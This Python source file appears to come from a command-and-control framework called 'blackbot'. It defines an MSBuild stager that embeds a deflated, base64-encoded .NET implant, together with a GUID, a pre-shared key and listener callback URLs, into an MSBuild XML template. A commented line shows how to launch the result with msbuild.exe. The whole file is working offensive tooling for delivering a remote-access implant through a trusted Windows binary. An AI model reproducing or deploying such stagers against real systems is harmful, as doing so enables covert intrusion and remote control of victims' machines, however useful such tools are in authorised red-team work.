import uuid
from blackbot.core.wss.crypto import gen_stager_psk
from blackbot.core.wss.stager import Stager
from blackbot.core.utils import gen_random_string_no_digits, get_path_in_package
from blackbot.core.wss.utils import dotnet_deflate_and_encode


class ARTIC2Stager(Stager):
    def __init__(self):
        self.name = 'msbuild'
        self.description = 'Stage via MSBuild XML inline C# task'
        self.suggestions = ''
        self.extension = 'xml'
        self.options = {}

    def generate(self, listener):
        with open(get_path_in_package('core/wss/data/naga.exe'), 'rb') as assembly:
            with open(get_path_in_package('core/wss/stagers/templates/msbuild.xml')) as template:
                guid = uuid.uuid4()
                psk = gen_stager_psk()

                c2_urls = ','.join(
                    filter(None, [listener['CallBackURls']])
                )

                template = template.read()
                template = template.replace('GUID', str(guid))
                template = template.replace('PSK', psk)
                template = template.replace('URLS', c2_urls)
                template = template.replace("NAME_GOES_HERE", gen_random_string_no_digits(5))
                template = template.replace("BASE64_ENCODED_ASSEMBLY", dotnet_deflate_and_encode(assembly.read()))
                return guid, psk, template

                #print_good(f"Generated stager to {stager.name}")
                #print_info(
                #    f"Launch with 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\msbuild.exe {stager_filename}'")
